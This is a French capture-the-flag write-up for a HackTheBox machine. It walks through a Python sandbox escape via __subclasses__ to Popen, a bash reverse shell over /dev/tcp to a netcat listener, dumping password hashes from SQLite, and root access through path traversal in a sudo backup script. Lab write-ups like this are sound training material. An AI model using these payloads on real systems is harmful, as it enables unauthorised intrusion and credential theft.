## Enumération

- **IP**
```
10.10.11.62
```

- **Nmap**
```
nmap -sC -sV -A 10.10.11.62
```

![[nmap.png]]On trouve deux port ouverts dont le port **5000** avec le service **http**. On va donc essayer d'accéder au site web via : `http://10.10.11.62:5000`

![[code-htb.png]]

On a donc un éditeur de code python. L'application web ne laisse pas faire `import` ou `eval` mais on sait qu'une **application fait echo aux éxceptions**. On peut donc faire sortir une erreur  pour savoir un peu ce qui se passe en dessous:

```
print((()).__class__.__bases__[0].__subclasses__())
```

![[Capture du 2025-06-10 20-26-28.png]]

l a craché un buffet entier de classes. Plus de 400 sous-classes. Quelque part là dedans , on doit chercher le `Popen`. Pourquoi? Parce que Popen vit dans le module de sous-processus, et c'est comme ça qu'on posera les commandes Shell.

Ici, on n'a pas la fonction `.index()` donc on peut faire une recherche. On va donc essayer de détourner la logique du programme jusqu'à une réussite avec des **obfuscations Python

```
raise Exception((()).__class__.__bases__[0].__subclasses__()[100].__name__)
```
!! Echec !!

```
raise Exception((()).__class__.__bases__[0].__subclasses__()[200].__name__)
```
!! Echec !!

```
raise Exception((()).__class__.__bases__[0].__subclasses__()[317].__name__)
```
!! **C'est là que se trouve le Popen** !!

![[popen.png]]


---

## Gain d'accès: 
On va maintenant ouvrir le port **4444** en écoute et attendre une connexion **TCP** avec **Netcat**:
```
nc -lvnp 4444
```

Maintenant que le port 4444 est en écoute, on peut exécuter ce code:
```
raise Exception(str((()) .__class__.__bases__[0].__subclasses__()[317](  
"bash -c 'bash -i >& /dev/tcp/your_IP/4444 0>&1'", shell=True, stdout=-1).communicate()))
```

Voilà, maintenant on est dans le **bash** de l'app
![[bash_app.png]]

On peut trouver l'**user flag** avec les commandes:
```
cd ..
ls
cat user.txt
```

![[user_flag.png]]

Dans le répertoire **/app/instance**, on peut trouver une base de donnée:

![[database.png]]

On peut accéder à cette base de données avec les commandes:
```
sqlite3 database.db
.tables
SELECT * FROM user
```

![[user_table.png]]

On constate qu'il y 2 utilisateurs avec leurs **user name** et des **mots de passe hashés**

## ssh sur l'utilisateur martin

```
shh martin@10.10.11.62
```

![[ssh_martin.png]]

On va essayer de savoir si **martin** a les droits **root** avec la commande `sudo -l`

![[test_root.png]]

**martin** n'a pas les droits **root** mais on constate qu'il y a un truc intéressant dans **/usr/bin/backy.sh*

Avant d'aller chercher quelque chose dans ce script, on va créer un script **json** permettant à **martin** d'avoir les droits **root**
```
cat > ~/root-steal.json << EOF
> {
>   "destination": "/home/",
>   "multiprocessing": true,
>   "verbose_log": true,
>   "directories_to_archive": [
>     "/home/....//root/"
>   ]
> }
> EOF

```

Une fois le fichier **.json** créer, on va l'exécuter en même temps que **backy.sh**
```
sudo /usr/bin/backy.sh /home/martin/root-steal.json
```

Voici le résultat:
![[exec_backy.png]]

l'exécution de **backy.sh** a aussi créer un fichier nommé `code_home_.._root_2025_June.tar.bz2` qui se trouve dans le répertoire **/home**

![[code_home.png]]

On va maintenant extraire ce fichier vers `/home/martin/root_dump`

```
tar -xvjf code_home_.._root_2025_June.tar.bz2 -C /home/martin/root_dump
```

Grâce à l'extraction de cette commande, un fichier **root.txt** est apparu dans le répertoire `/home/martin/root_dump/root`

![[root_txt.png]]

Et voila !!!!

`